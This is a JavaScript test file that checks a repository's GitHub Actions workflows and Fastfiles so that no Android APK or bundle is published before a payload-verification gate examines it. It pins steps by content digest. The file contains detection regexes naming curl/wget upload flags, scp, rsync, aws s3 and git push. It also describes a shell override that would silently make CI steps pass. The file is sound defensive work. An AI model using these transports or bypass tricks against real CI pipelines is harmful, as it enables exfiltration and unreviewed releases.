const fs = require('fs');
const path = require('path');
const yaml = require('js-yaml');
const {createHash} = require('crypto');

/**
 * Nothing may ship an Android artifact that the payload gate has not examined.
 * The property is read off the committed workflow and Fastfile text: a step
 * reordering, an added `if:`, or a publishing step in a new workflow all break
 * it, and none of them announces itself.
 *
 * Two things about the shape. The rules are applied to a parsed model, never to
 * the files in place, so every one of them is also exercised against a
 * deliberately broken copy — a rule asserted only over the committed files is
 * true today and held by nothing tomorrow. And inside a job that builds
 * Android the default is inverted: a step `ACCOUNTED_STEPS` does not name is a
 * violation. Recognising every way a step might publish is a question about an
 * open set; naming the steps this repository has is a question about a closed
 * one.
 */
const ROOT = path.join(__dirname, '..', '..');
const WORKFLOW_DIR = path.join(ROOT, '.github', 'workflows');

// Named explicitly rather than globbed: a fourth Fastfile ships inside
// vendor/bundle wherever `bundle install` has run, so a glob count would be
// environment-dependent and unfit for a vacuity guard.
/** Pinned by content, like the composites: free-form Ruby behind one `run:`. */
const ACCOUNTED_FASTFILES = {
  root: 'c50e1384844af4d5c37cd9d5',
  android: '3173e30e8166a178fafe40a0',
  ios: '9d6c9e883a56dfe47abc0462',
};

const FASTFILES = [
  ['root', path.join(ROOT, 'fastlane', 'Fastfile')],
  ['android', path.join(ROOT, 'android', 'fastlane', 'Fastfile')],
  ['ios', path.join(ROOT, 'ios', 'fastlane', 'Fastfile')],
];

const KNOWN_WORKFLOWS = [
  'ci.yml',
  'e2e-tests.yml',
  'l10n-upload.yml',
  'release.yml',
];

const SUSPICIOUS_RUN =
  /upload|publish|release|git push|gh |curl|wget|scp|rsync|aws s3/i;

// -- parsing ---------------------------------------------------------------

/**
 * Commentary is not command. Both Ruby and shell use `#`, and both files
 * discuss the very actions this file classifies — the upload lane's comment
 * quotes `gradle(task: "bundle")` to explain why it does not build.
 *
 * Quote state carries across lines, because a `run: |` block is one script and
 * a quoted string may span several of them. Every consumer of this text is an
 * unanchored presence test, so dropping a line's tail can only *lose* matches,
 * which moves a step toward "publishes nothing" and "carries no transport" —
 * the one direction this file cannot afford to be wrong in. An unbalanced
 * quote therefore leaves the remainder unstripped: noisier, never blinder.
 */
function codeOf(text) {
  const lines = String(text).split('\n');
  let quote = null;
  return lines
    .map(line => {
      let cut = line.length;
      for (let i = 0; i < line.length; i++) {
        const character = line[i];
        if (quote) {
          if (character === '\\') {
            i++;
          } else if (character === quote) {
            quote = null;
          }
          continue;
        }
        if (character === '"' || character === "'") {
          quote = character;
          continue;
        }
        if (
          character === '#' &&
          line[i + 1] !== '{' &&
          (i === 0 || /\s/.test(line[i - 1]))
        ) {
          cut = i;
          break;
        }
      }
      return line.slice(0, cut);
    })
    .join('\n');
}

/**
 * A step's whole content, canonically. Every key is included — `env`,
 * `working-directory`, `if`, `with`, `uses`, and any key GitHub adds later —
 * because naming the ones that matter is the judgement this file has learned
 * not to make. The script is the comment-stripped one, so rewording a comment
 * is not a change — adding or removing a comment *line* is, because stripping
 * leaves the blank line behind.
 */
const canonical = value => {
  if (Array.isArray(value)) {
    return value.map(canonical);
  }
  if (value && typeof value === 'object') {
    return Object.keys(value)
      .sort()
      .reduce((out, key) => {
        out[key] = key === 'run' ? codeOf(value[key]) : canonical(value[key]);
        return out;
      }, {});
  }
  return value;
};

const digestOfValue = value =>
  createHash('sha256')
    .update(JSON.stringify(canonical(value)))
    .digest('hex')
    .slice(0, 24);

function digestOf(step) {
  const {run: _raw, ...rest} = step.raw;
  return digestOfValue({
    ...rest,
    run: step.run,
    uses: step.uses,
    with: step.with,
  });
}

/**
 * The container a step runs in. `defaults.run.shell` can replace the shell for
 * every step in the job — `bash -c "bash {0}; true"` makes each one exit 0 —
 * `env` can preload a module into every `node`, `working-directory` moves the
 * paths a script's flags name, and `container`/`runs-on` decide the machine.
 * None of that is visible in any step, and all of it decides what a step does.
 */
const jobDigestOf = job =>
  digestOfValue({job: job.jobKeys, workflow: job.workflowKeys});

function parseLanes() {
  const lanes = [];
  for (const [origin, file] of FASTFILES) {
    const source = fs.readFileSync(file, 'utf-8');
    const starts = [...source.matchAll(/^\s*lane\s+:(\w+)\s+do/gm)];
    starts.forEach((match, i) => {
      const end = i + 1 < starts.length ? starts[i + 1].index : source.length;
      lanes.push({
        origin,
        name: match[1],
        body: codeOf(source.slice(match.index, end)),
      });
    });
  }
  return lanes;
}

function parseWorkflows() {
  return fs
    .readdirSync(WORKFLOW_DIR)
    .filter(name => /\.ya?ml$/.test(name))
    .sort()
    .map(file => {
      const doc = yaml.load(
        fs.readFileSync(path.join(WORKFLOW_DIR, file), 'utf-8'),
      );
      const {jobs: _jobs, ...workflowKeys} = doc;
      const jobs = Object.entries(doc.jobs || {}).map(([id, job]) => {
        const {steps: _steps, ...jobKeys} = job;
        return {
          workflow: file,
          id,
          jobKeys,
          workflowKeys,
          steps: (job.steps || []).map((step, index) => ({
            workflow: file,
            job: id,
            index,
            name: step.name || `(step ${index})`,
            run: codeOf(step.run || ''),
            uses: step.uses || '',
            with: step.with || {},
            raw: step,
          })),
        };
      });
      return {file, jobs};
    });
}

const fastfileDigest = () =>
  Object.fromEntries(
    FASTFILES.map(([origin, file]) => [
      origin,
      digestOfValue(codeOf(fs.readFileSync(file, 'utf-8'))),
    ]),
  );

const model = () => ({workflows: parseWorkflows(), lanes: parseLanes()});
const allJobs = m => m.workflows.flatMap(workflow => workflow.jobs);
const allSteps = m => allJobs(m).flatMap(job => job.steps);
const where = step => `${step.workflow} ${step.job} → ${step.name}`;

// -- what a step says ------------------------------------------------------

/**
 * Every lane a step's command names. Matched against the known lane names
 * rather than by position, because `fastlane <lane>`, `fastlane android <lane>`
 * and `fastlane run <action>` are all valid here — `android/fastlane/Fastfile`
 * declares `default_platform :android`, so the platform-prefixed form works and
 * a position-based parse silently resolves it to the platform instead.
 *
 * `release.yml/build_android` runs no `gradlew` at all, so that job's entire
 * building-ness rests on this resolution.
 */
function lanesInvokedBy(step, lanes) {
  const named = body =>
    new Set(
      [...body.matchAll(/fastlane\s+([\w\s]+)/g)].flatMap(match =>
        match[1].split(/\s+/),
      ),
    );
  // Transitively: a lane may call another by bare name, so a body reached this
  // way is as much part of what the step does as the one it named directly.
  const reached = new Map();
  const walk = names => {
    for (const lane of lanes.filter(
      candidate => names.has(candidate.name) && !reached.has(candidate.name),
    )) {
      reached.set(lane.name, lane);
      const calls = new Set([
        ...named(lane.body),
        ...[...lane.body.matchAll(/^\s*(\w+)\s*$/gm)].map(match => match[1]),
      ]);
      walk(calls);
    }
  };
  walk(named(step.run));
  return [...reached.values()];
}

/**
 * Everything a step's text can be read to name, the bodies of the fastlane
 * lanes it invokes included. It does not follow shell scripts: a step that
 * rewrites an artifact without naming its path is outside what a text parse
 * can see, and is recorded as a known remainder rather than claimed.
 */
function stepText(step, lanes) {
  return [
    step.run,
    JSON.stringify(step.with),
    ...lanesInvokedBy(step, lanes).map(lane => lane.body),
  ].join('\n');
}

function artifactsIn(text) {
  return [
    ...new Set(
      [...String(text).matchAll(/([\w.-]+\.(?:apk|aab))/g)].map(m => m[1]),
    ),
  ];
}

/**
 * One entry per `git push`, its arguments trimmed — the empty string included,
 * because a bare push is an invocation and not an absence.
 */
function gitPushArguments(run) {
  return [...run.matchAll(/git\s+push\b([^\n]*)/g)].map(match =>
    match[1].trim(),
  );
}

function buildsAndroid(body) {
  return (
    /\bgradle\s*\(/.test(body) && /task:\s*"(?:assemble|bundle)"/.test(body)
  );
}

function publishesAndroid(body) {
  return /upload_to_play_store|\bsupply\s*\(/.test(body);
}

function isBuildingJob(job, lanes) {
  return job.steps.some(step => {
    const script = step.run.replace(/\\\n\s*/g, ' ');
    // Any gradle invocation at all. Naming the tasks that build meant missing
    // `build`, and `:app:aPR` abbreviates `:app:assembleProdRelease`.
    return (
      /\b(?:gradlew|gradle)\b/.test(script) ||
      lanesInvokedBy(step, lanes).some(lane => buildsAndroid(lane.body))
    );
  });
}

function isGateStep(step) {
  return (
    step.run.includes('verify-android-payload.js') &&
    /--(?:apk|aab)\b/.test(step.run)
  );
}

function gateExamines(step) {
  return [...step.run.matchAll(/--(?:apk|aab)\s+(\S+)/g)].map(match =>
    path.basename(match[1]),
  );
}

/**
 * A `with:` path field, split into what it actually names. The whole value is
 * a path here — one per line, or one per list entry — so anything that is not
 * a concrete filename hides one, whatever directory it lives in. Keying on
 * `build/outputs` instead would leave `dist/`, `artifacts/` and
 * `android/app/release/` naming nothing and classifying as no publisher at all.
 */
/**
 * The uploads whose paths are known not to be build output. Small, pinned, and
 * asserted to reach no build-output directory: a concrete filename that is not
 * an `.apk`/`.aab` is not thereby harmless — `tar czf out/x.tgz …/apk` produces
 * one — so the parse vouches only for the paths written down here.
 */
const NON_ARTIFACT_UPLOADS = [
  'payload-report.txt',
  'ios/build/PocketPal.app.dSYM.zip',
];

/**
 * A `with:` path field, split into what it names. The whole value is a path
 * here — one per line, or one per list entry — so each token is an artifact
 * this parse can name, a declared non-artifact upload, or something it cannot
 * vouch for at all.
 */
function pathFieldNames(value) {
  const tokens = (
    Array.isArray(value) ? value : String(value ?? '').split('\n')
  )
    .map(token => String(token).trim())
    .filter(Boolean);

  return tokens.map(token => {
    const base = token.split('/').pop();
    const concrete =
      !token.includes('${{') &&
      !/[*?]/.test(token) &&
      !token.endsWith('/') &&
      /\.[A-Za-z0-9]+$/.test(base);
    if (!concrete) {
      return {kind: 'unreadable', token};
    }
    if (/\.(?:apk|aab)$/.test(base)) {
      return {kind: 'artifact', token: base};
    }
    // Matched on the whole path, not the basename: `…/build/outputs/payload-report.txt`
    // is a different file from the one declared here.
    return NON_ARTIFACT_UPLOADS.includes(token)
      ? {kind: 'declared', token}
      : {kind: 'undeclared', token};
  });
}

/**
 * The same judgement over a shell command, but token by token rather than over
 * the whole text — most of a command's words are not paths, and `gh release
 * create v1.0.0` publishes no binary at all. Only a token that reaches an
 * Android build output or carries an `.apk`/`.aab` is considered, and each is
 * then resolvable or not on its own: asking the question of the whole string
 * would mark the Play upload unresolvable because the lane that names its
 * bundle exactly also happens to sit under `build/outputs`.
 */
function commandNames(text) {
  const seen = new Map();
  for (const token of String(text ?? '').split(/[\s'"(),]+/)) {
    if (!token || /^[a-z][a-z0-9+.-]*:\/\//i.test(token)) {
      continue;
    }
    // A word is a candidate path if it is shaped like one. A bare `"$ARTIFACT"`
    // is not caught here and does not need to be: it resolves to nothing, and a
    // publisher that resolves to nothing is refused.
    if (!token.includes('/') && !/[*?]/.test(token)) {
      continue;
    }
    const base = token.split('/').pop();
    const concrete =
      !token.includes('$') &&
      !/[*?]/.test(token) &&
      !token.endsWith('/') &&
      /\.[A-Za-z0-9]+$/.test(base);
    if (!concrete) {
      seen.set(token, {kind: 'unreadable', token});
    } else if (/\.(?:apk|aab)$/.test(base)) {
      seen.set(base, {kind: 'artifact', token: base});
    }
  }
  return [...seen.values()];
}

/**
 * Every way this repository can put built bytes in front of someone.
 *
 * Additive, not first-match: a step can be more than one of these at once, and
 * a single path list can mix a filename the gate examined with a glob reaching
 * a second artifact it never saw.
 */
function publisherOf(step, lanes) {
  const text = stepText(step, lanes);
  const rules = [];
  const named = [];
  const add = (rule, tokens) => {
    rules.push(rule);
    named.push(...tokens);
  };

  // Unconditional, like the other four: declining to classify when no artifact
  // can be read makes the empty-resolution refusal unreachable for this class.
  if (/^actions\/upload-artifact@/.test(step.uses)) {
    add('workflow-artifact', pathFieldNames(step.with.path));
  }
  if (/^softprops\/action-gh-release@/.test(step.uses)) {
    add('github-release', pathFieldNames(step.with.files));
  }
  if (step.run) {
    if (/upload_to_play_store/.test(text)) {
      add('play-upload', commandNames(text));
    }
    if (/\bgh\s+release\s+(?:create|upload)/.test(step.run)) {
      add('gh-release-cli', commandNames(step.run));
    }
    if (gitPushArguments(step.run).some(args => args !== '')) {
      add('tag-push', []);
    }
  }
  if (rules.length === 0) {
    return null;
  }
  return {
    rules,
    paths: [
      ...new Set(
        named.filter(one => one.kind === 'artifact').map(one => one.token),
      ),
    ],
    concerns: named.filter(
      one => one.kind === 'unreadable' || one.kind === 'undeclared',
    ),
    declared: named.filter(one => one.kind === 'declared').length,
  };
}

function obtainsAndroidOutput(step) {
  return (
    /^actions\/download-artifact@/.test(step.uses) ||
    /gh\s+run\s+download/.test(step.run) ||
    /\b(?:curl|wget)\b/.test(step.run) ||
    (/^actions\/cache@/.test(step.uses) &&
      /build\/outputs/.test(JSON.stringify(step.with)))
  );
}

// -- the exemption surfaces, each with a reason and a checked assertion -----

/**
 * Two transport patterns, not one, because `curl` and `wget` are transports in
 * both directions. A build step has no business running either; a composite
 * action that provisions an SDK legitimately fetches with `curl`, and is held
 * instead by naming no artifact.
 */
const SENDS_BYTES_OUT =
  /upload_to_|git push|gh\s+(?:release|api)|scp\s|rsync\s|aws s3|(?:curl|wget)[^\n]*\s(?:-T\b|--upload-file|-F\b|--form|-d\b|--data|--post-file|-X\s*(?:POST|PUT))/;
const MOVES_BYTES_AT_ALL = new RegExp(
  `${SENDS_BYTES_OUT.source}|\\bcurl\\b|\\bwget\\b`,
);

const namesNoAndroidArtifact = (step, _job, m) =>
  artifactsIn(stepText(step, m.lanes)).length === 0;

const carriesNoTransport = (step, _job, m) =>
  !MOVES_BYTES_AT_ALL.test(stepText(step, m.lanes));

/** A property of the job, so it is never the whole assertion. */
const gatedLaterInTheSameJob = (step, job) =>
  job.steps.some(other => other.index > step.index && isGateStep(other));

const handlesNoArtifact = (step, job, m) =>
  namesNoAndroidArtifact(step, job, m) && carriesNoTransport(step, job, m);

const buildsThenIsGated = (step, job, m) =>
  gatedLaterInTheSameJob(step, job) && handlesNoArtifact(step, job, m);

const pushesOnlyTheBumpCommit = (step, job, m) =>
  gitPushArguments(step.run).every(args => args === '') &&
  namesNoAndroidArtifact(step, job, m);

/** Reads only the job, so it is paired with a step-reading half at every use. */
const runsNoAndroidGradle = (step, job, m) => !isBuildingJob(job, m.lanes);

/**
 * Every step of a building job, and the steps outside them that the suspicion
 * net flags. Nothing is exempt by what it is: the gate, the publishers and the
 * allowlisted actions are all here, because being recognised as one of those
 * was itself a way to stop being looked at.
 *
 * Each row pins the step's **content**, so an edit inside an already-accounted
 * step costs the same reviewed line that adding a step costs. The list of steps
 * is closed, and so is what a step may contain. The assertions beside the rows
 * stay as a second line of defence, but they are no longer what holds the
 * property: they can refuse only the transports somebody thought of, and the
 * digest refuses the rest.
 *
 * A row is `[workflow, job, step, digest, reason, assertion]`. A `null` digest
 * marks a step outside the building jobs, where the content pin does not apply.
 */
const STEP_ASSERTIONS = {
  handlesNoArtifact,
  buildsThenIsGated,
  pushesOnlyTheBumpCommit,
  carriesNoTransport,
  isGateStep: step => isGateStep(step),
  // No assertion of its own, and it says so rather than manufacturing one that
  // cannot fail: a publisher is held by ordering and path identity, and by the
  // content pin, which is what stops it growing a second publish beside the one
  // it is here for.
  publisher: null,
  reportUpload: (step, _job, m) => {
    const publisher = publisherOf(step, m.lanes);
    return (
      publisher !== null &&
      publisher.paths.length === 0 &&
      publisher.concerns.length === 0 &&
      publisher.declared > 0
    );
  },
  iosUpload: (step, job, m) =>
    runsNoAndroidGradle(step, job, m) &&
    namesNoAndroidArtifact(step, job, m) &&
    m.lanes
      .filter(lane => lane.origin === 'ios')
      .every(lane => !publishesAndroid(lane.body)),
  weblateUpload: (step, job, m) =>
    runsNoAndroidGradle(step, job, m) && namesNoAndroidArtifact(step, job, m),
  // Carries the action allowlist's own reason and assertion.
  action: (step, job, m) => {
    const entry = ALLOWED_ACTIONS[step.uses];
    return Boolean(entry) && (!entry.assert || entry.assert(step, job, m));
  },
};

/**
 * The container digest of each building job: its own keys and its workflow's.
 * Pinned exactly as the steps are, and for the same reason — the step pin says
 * what runs, and this says what it runs inside.
 */
const ACCOUNTED_JOBS = {
  'ci.yml/build-android': '5fd36b4c2d4f458ecea15067',
  'e2e-tests.yml/build-android': '64c3e66ce532792211e56a71',
  'release.yml/build_android': '245f22e44c67837147d62cf4',
};

const ACCOUNTED_STEPS = [
  [
    'ci.yml',
    'build-android',
    'Check out code',
    'ddb2f046a7c14c47cb2aca25',
    'checks out the repository',
    'action',
  ],
  [
    'ci.yml',
    'build-android',
    'Maximize build space',
    '4d41c4a237cdd832e94ca58d',
    'frees disk before the toolchains install',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Set up Node.js',
    '8f92aaf91be034f522d95925',
    'installs Node',
    'action',
  ],
  [
    'ci.yml',
    'build-android',
    'Cache node_modules',
    'f4ef7d94313503bc5e42fbea',
    'restores the dependency cache',
    'action',
  ],
  [
    'ci.yml',
    'build-android',
    'Install Yarn',
    '74f8204ffaff7cc6680b3f4f',
    'installs the package manager',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Install dependencies',
    'df124beeabda40ea24cff7e5',
    'installs the JS dependency tree',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Derive the rnllama variant allowlist from the payload manifest',
    '27fd84e82e8128653d865ec8',
    'reads the manifest and exports a gradle property',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Cache llama.rn native build tree',
    'a7690de26de00d99595df1d1',
    'restores the native build tree',
    'action',
  ],
  [
    'ci.yml',
    'build-android',
    'Set up JDK 17',
    'bcb91f2c754f7c81fdfa1899',
    'installs the JDK',
    'action',
  ],
  [
    'ci.yml',
    'build-android',
    'Set up the Hexagon SDK',
    'fb3527993437be992b2b10a0',
    'fetches and verifies the Hexagon SDK',
    'action',
  ],
  [
    'ci.yml',
    'build-android',
    'Set up ccache',
    '71c9892ff90802db41d716d7',
    'restores the compiler cache',
    'action',
  ],
  [
    'ci.yml',
    'build-android',
    'Create dummy google-services.json for CI',
    'e15bdfd6f028509f2867d597',
    'writes a placeholder config',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Create dummy .env file for CI',
    '0752168128c67ff7b87d9bea',
    'writes placeholder build configuration',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Create dummy release keystore for CI',
    'e2776b4eece8c6640def243c',
    'writes a throwaway signing key',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Build Android Release',
    '8edc74417d96cb7debd71aa5',
    'builds the artifact the gate then examines in the same job',
    'buildsThenIsGated',
  ],
  [
    'ci.yml',
    'build-android',
    'ccache statistics',
    '79d772e38080380d4f45facf',
    'prints compiler cache counters',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Verify the variant allowlist reached the llama.rn build',
    '698e98dba6cc9c1f508193a3',
    'greps the build log for the declared variant list',
    'handlesNoArtifact',
  ],
  [
    'ci.yml',
    'build-android',
    'Verify prod APK has no automation-bridge code (DCE sanity check)',
    '507d08fb6e5b78d1044cd9ce',
    'reads the built APK to assert what it does not contain',
    'carriesNoTransport',
  ],
  [
    'ci.yml',
    'build-android',
    'Verify the Android payload',
    'ea93b4c01dbd7de15eaa17f8',
    'is the payload gate itself',
    'isGateStep',
  ],
  [
    'ci.yml',
    'build-android',
    'Upload payload report',
    'c9025c2bef53b6cb994fda70',
    "uploads the gate's report, which is evidence about the artifact rather than the artifact",
    'reportUpload',
  ],
  [
    'ci.yml',
    'build-android',
    'Upload Android APK',
    '74ec2ebad81aab6c9ac1d101',
    'publishes the checked APK as a workflow artifact',
    'publisher',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Checkout',
    'cf37721dff3e3d1d92137794',
    'checks out the repository',
    'action',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Setup Java',
    '3a5994f8db80c1d68c8d7766',
    'installs the JDK',
    'action',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Setup Node.js',
    '72f06927c12cb51147347849',
    'installs Node',
    'action',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Install dependencies',
    '1781a40fca382b9ee3009490',
    'installs the JS dependency tree',
    'handlesNoArtifact',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Derive the rnllama variant allowlist from the payload manifest',
    '27fd84e82e8128653d865ec8',
    'reads the manifest and exports a gradle property',
    'handlesNoArtifact',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Set up the Hexagon SDK',
    'fb3527993437be992b2b10a0',
    'fetches and verifies the Hexagon SDK',
    'action',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Create dummy google-services.json for CI',
    '5b3655f75fe0cd8f0da5a43c',
    'writes a placeholder config',
    'handlesNoArtifact',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Create dummy .env file for CI',
    'b1cbd6733e44731e10eff450',
    'writes placeholder build configuration',
    'handlesNoArtifact',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Create dummy release keystore for CI',
    '59912466755b57ee64d54974',
    'writes a throwaway signing key',
    'handlesNoArtifact',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Build Android E2E APK',
    '404ac64be90c0065f456113d',
    'builds the artifact the gate then examines in the same job',
    'buildsThenIsGated',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Verify the variant allowlist reached the llama.rn build',
    '698e98dba6cc9c1f508193a3',
    'greps the build log for the declared variant list',
    'handlesNoArtifact',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Verify the Android payload',
    '96059495fc7c0d510fd52aaa',
    'is the payload gate itself',
    'isGateStep',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Upload payload report',
    'c9025c2bef53b6cb994fda70',
    "uploads the gate's report, which is evidence about the artifact rather than the artifact",
    'reportUpload',
  ],
  [
    'e2e-tests.yml',
    'build-android',
    'Upload APK artifact',
    'a268f3772d59a8970b71e979',
    'publishes the checked APK as a workflow artifact',
    'publisher',
  ],
  [
    'release.yml',
    'build_android',
    'Checkout code',
    'ed632cdea5905cf8c8949d4e',
    'checks out the repository',
    'action',
  ],
  [
    'release.yml',
    'build_android',
    'Maximize build space',
    '4d41c4a237cdd832e94ca58d',
    'frees disk before the toolchains install',
    'handlesNoArtifact',
  ],
  [
    'release.yml',
    'build_android',
    'Set up JDK 17',
    '93c113a968c5acb9a42759bb',
    'installs the JDK',
    'action',
  ],
  [
    'release.yml',
    'build_android',
    'Set up Node.js',
    '8f92aaf91be034f522d95925',
    'installs Node',
    'action',
  ],
  [
    'release.yml',
    'build_android',
    'Install dependencies',
    'df124beeabda40ea24cff7e5',
    'installs the JS dependency tree',
    'handlesNoArtifact',
  ],
  [
    'release.yml',
    'build_android',
    'Derive the rnllama variant allowlist from the payload manifest',
    '27fd84e82e8128653d865ec8',
    'reads the manifest and exports a gradle property',
    'handlesNoArtifact',
  ],
  [
    'release.yml',
    'build_android',
    'Set up the Hexagon SDK',
    'fb3527993437be992b2b10a0',
    'fetches and verifies the Hexagon SDK',
    'action',
  ],
  [
    'release.yml',
    'build_android',
    'Set up Ruby',
    'c6bd8de9ca3a97dfa137eb1a',
    'installs Ruby and the bundle',
    'action',
  ],
  [
    'release.yml',
    'build_android',
    'Bump versions',
    'edf1504a267b4f22dbcfbcbb',
    'rewrites the version in tracked files',
    'handlesNoArtifact',
  ],
  [
    'release.yml',
    'build_android',
    'Commit and push version changes',
    '14002b2eb6a5a9041659e3a3',
    'pushes the version-bump commit; the tag is pushed after the gate',
    'pushesOnlyTheBumpCommit',
  ],
  [
    'release.yml',
    'build_android',
    'Set up Android Keystore',
    'e8ae052abd033b10f315b388',
    'writes the signing keystore',
    'handlesNoArtifact',
  ],
  [
    'release.yml',
    'build_android',
    'Authenticate to Google Cloud',
    '6ab20557d737acb66b9c5019',
    'mints a Google Cloud credential',
    'action',
  ],
  [
    'release.yml',
    'build_android',
    'Create .env file',
    '932c23c2e0226c77099b814d',
    'writes build configuration',
    'handlesNoArtifact',
  ],
  [
    'release.yml',
    'build_android',
    'Build Android app',
    'efc23e757a4ec3576d0ed3f8',
    'builds the artifacts the gate then examines in the same job',
    'buildsThenIsGated',
  ],
  [
    'release.yml',
    'build_android',
    'Verify the variant allowlist reached the llama.rn build',
    '698e98dba6cc9c1f508193a3',
    'greps the build log for the declared variant list',
    'handlesNoArtifact',
  ],
  [
    'release.yml',
    'build_android',
    'Verify the Android payload',
    '3a5ceba12bf9ca828dfb3373',
    'is the payload gate itself',
    'isGateStep',
  ],
  [
    'release.yml',
    'build_android',
    'Upload payload report',
    'c9025c2bef53b6cb994fda70',
    "uploads the gate's report, which is evidence about the artifact rather than the artifact",
    'reportUpload',
  ],
  [
    'release.yml',
    'build_android',
    'Upload Android app to Alpha track',
    '3f3f10876f2cdb90f5d7e89b',
    'publishes the checked bundle to Play',
    'publisher',
  ],
  [
    'release.yml',
    'build_android',
    'Push the release tag',
    'bba9bef8ba948fa546cc2ed2',
    'pushes the release tag after the gate',
    'publisher',
  ],
  [
    'release.yml',
    'build_android',
    'Create GitHub Release',
    '62888b052a7934ada019efc1',
    'publishes the checked APK to a GitHub Release',
    'publisher',
  ],
  [
    'release.yml',
    'build_ios',
    'Build and upload iOS app',
    null,
    'uploads to TestFlight; carries no Android payload',
    'iosUpload',
  ],
  [
    'ci.yml',
    'build-ios',
    'Build iOS Release',
    null,
    'builds an iOS binary and transports nothing',
    'handlesNoArtifact',
  ],
  [
    'l10n-upload.yml',
    'upload',
    'Upload to Weblate',
    null,
    'uploads src/locales/en.json to the translation service',
    'weblateUpload',
  ],
].map(([workflow, job, step, digest, reason, assertion]) => ({
  workflow,
  job,
  step,
  digest,
  reason,
  assert: STEP_ASSERTIONS[assertion],
}));

const COMPOSITE_ACTIONS = {
  './.github/actions/setup-hexagon-sdk': path.join(
    ROOT,
    '.github/actions/setup-hexagon-sdk/action.yml',
  ),
  './.github/actions/setup-ccache': path.join(
    ROOT,
    '.github/actions/setup-ccache/action.yml',
  ),
};

/**
 * Takes the source, not the path, so a mutated composite can be probed.
 *
 * A composite's inner steps are steps, and the one that ships bytes is more
 * likely to be `uses: actions/upload-artifact@v4` with a `path:` than a raw
 * shell command, so all three fields are read — the same text `stepText`
 * gives a step.
 */
const shipsNothing = source => {
  const runs = yaml.load(source).runs ?? {};
  // Only a composite is a list of steps this can read. `using: node20` and
  // `using: docker` run code this parse never sees, and a composite with no
  // steps at all is a shape it has never been shown, so none of them can be
  // judged — and "cannot judge" is not "ships nothing".
  if (
    runs.using !== 'composite' ||
    !Array.isArray(runs.steps) ||
    runs.steps.length === 0
  ) {
    return false;
  }
  const steps = runs.steps;
  const text = steps
    .map(step =>
      [step.run || '', step.uses || '', JSON.stringify(step.with || {})].join(
        '\n',
      ),
    )
    .join('\n');
  // An inner `uses:` is a step like any other, and nothing else allowlists it —
  // a nested composite or an unreviewed third-party action would otherwise ride
  // in under the outer action's entry.
  // An inner `uses:` is a step like any other. A nested composite or an
  // unreviewed third-party action rides in under the outer action's entry, and
  // a publishing action is refused outright — ordering and path identity are
  // what hold those, and neither of them reaches inside a composite.
  const publishes = steps.some(
    step =>
      step.uses &&
      (!ALLOWED_ACTIONS[step.uses] ||
        /^(?:actions\/upload-artifact|softprops\/action-gh-release)@/.test(
          step.uses,
        )),
  );
  return (
    !publishes &&
    !SENDS_BYTES_OUT.test(text) &&
    !/build\/outputs/.test(text) &&
    artifactsIn(text).length === 0
  );
};

const compositeShipsNothing = step =>
  shipsNothing(fs.readFileSync(COMPOSITE_ACTIONS[step.uses], 'utf-8'));

const compositeDigest = uses =>
  createHash('sha256')
    .update(codeOf(fs.readFileSync(COMPOSITE_ACTIONS[uses], 'utf-8')))
    .digest('hex')
    .slice(0, 12);

const cacheReachesNoBuildOutput = step =>
  !/build\/outputs/.test(JSON.stringify(step.with));

/**
 * The actions a step may use without being classified. Floored exactly like
 * ACCOUNTED_STEPS: otherwise the cheapest way to publish through a new
 * third-party action is to add its name here.
 *
 * An entry declares **either** an `assert` that some input can falsify — the
 * probe below proves each one can — **or** a `carriedBy` naming the rule that
 * holds it instead. The two artifact-shipping actions get the second: for them
 * "is this a publisher?" is decided by the action name itself, so any
 * assertion phrased over the step restates its own lookup key and cannot fail.
 * Saying so is honest; writing a tautology and calling it a check is the shape
 * of the holes this file exists to close.
 */
const ALLOWED_ACTIONS = {
  'actions/checkout@v3': {
    reason: 'reads the repository',
    assert: namesNoAndroidArtifact,
  },
  'actions/checkout@v4': {
    reason: 'reads the repository',
    assert: namesNoAndroidArtifact,
  },
  'actions/setup-node@v3': {
    reason: 'installs a toolchain',
    assert: namesNoAndroidArtifact,
  },
  'actions/setup-node@v4': {
    reason: 'installs a toolchain',
    assert: namesNoAndroidArtifact,
  },
  'actions/setup-java@v3': {
    reason: 'installs a toolchain',
    assert: namesNoAndroidArtifact,
  },
  'actions/setup-java@v4': {
    reason: 'installs a toolchain',
    assert: namesNoAndroidArtifact,
  },
  'ruby/setup-ruby@v1': {
    reason: 'installs a toolchain',
    assert: namesNoAndroidArtifact,
  },
  'actions/cache@v3': {
    reason: 'restores a dependency cache',
    assert: cacheReachesNoBuildOutput,
  },
  'actions/cache@v4': {
    reason: 'restores a dependency cache',
    assert: cacheReachesNoBuildOutput,
  },
  'google-github-actions/auth@v2': {
    reason: 'mints a Google Cloud credential',
    assert: namesNoAndroidArtifact,
  },
  'actions/upload-artifact@v4': {
    reason:
      'uploads a workflow artifact; whether it ships build output is decided by its own path, and a path that cannot be resolved to a filename is refused rather than skipped',
    carriedBy: 'ordering and path identity',
  },
  'softprops/action-gh-release@v1': {
    reason: 'always a publisher, by the action name alone',
    carriedBy: 'ordering and path identity',
  },
  // Pinned by content, like the steps. A composite is free-form shell behind
  // one `uses:`, so reading it for transports would be the same enumeration
  // that has leaked everywhere else; the digest is what holds it, and
  // `shipsNothing` is the second line.
  './.github/actions/setup-hexagon-sdk': {
    reason: 'fetches and verifies the Hexagon SDK',
    assert: compositeShipsNothing,
